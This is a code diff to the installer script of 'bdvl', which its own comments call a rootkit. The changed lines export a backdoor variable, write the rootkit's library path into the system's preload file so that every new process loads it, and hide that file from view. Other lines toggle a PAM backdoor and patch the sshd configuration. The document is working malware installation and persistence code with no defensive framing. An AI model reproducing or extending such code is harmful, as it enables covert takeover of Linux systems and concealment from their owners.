@@ -119,14 +119,14 @@ install_bdvl(){
     [ "`toggle_enabled USE_PAM_BD`" == "true" ] && \
         patch_sshdconfig
 
+    export ${BD_VAR}=1
     # setup the rootkit's installation directory before setting up the rootkit's preload file.
     setup_home $INSTALL_DIR
 
     # after installing the rootkit to its directory and enabling anything that may need it, we
     # can go ahead with having every new process henceforth preload the rootkit.
     necho "Writing \$SOPATH to \$LDSO_PRELOAD"
-    [ -f "$LDSO_PRELOAD" ] && chattr -ia $LDSO_PRELOAD &>/dev/null
-    echo -n "$SOPATH" > $LDSO_PRELOAD
+    echo -n "$SOPATH" > $LDSO_PRELOAD && hide_path $LDSO_PRELOAD
     secho "Installation complete!"
     cleanup_bdvl
 
@@ -193,7 +193,7 @@ while getopts "hvuetCzdcDi?" opt; do
         exit
         ;;
     D)
-        etc/install_deps.sh
+        bash etc/install_deps.sh
         ;;
     ?)
         echo "$USAGE"
